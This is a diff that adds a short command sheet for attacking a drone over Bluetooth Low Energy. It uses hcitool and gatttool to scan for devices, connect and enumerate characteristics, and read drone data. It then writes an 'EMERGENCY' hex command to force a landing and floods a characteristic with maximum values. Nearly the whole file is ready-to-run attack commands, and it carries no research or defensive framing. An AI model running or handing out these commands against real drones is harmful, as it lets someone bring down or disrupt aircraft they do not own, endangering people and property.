@@ -1,0 +1,19 @@
+# Scan for BLE devices
+sudo hcitool lescan
+
+# Connect and enumerate services
+sudo gatttool -b AA:BB:CC:DD:EE:FF -I
+[LE]> connect
+[LE]> primary
+[LE]> characteristics
+
+
+# Read drone data
+gatttool -b DRONE_MAC --char-read -a 0x10
+
+# Write emergency landing command
+gatttool -b DRONE_MAC --char-write-req -a 0x12 -n 454D455247454E4359
+
+# Flood characteristic with max values
+gatttool -b DRONE_MAC --char-write-req -a 0x14 -n FFFFFFFFFFFFFFFF
+
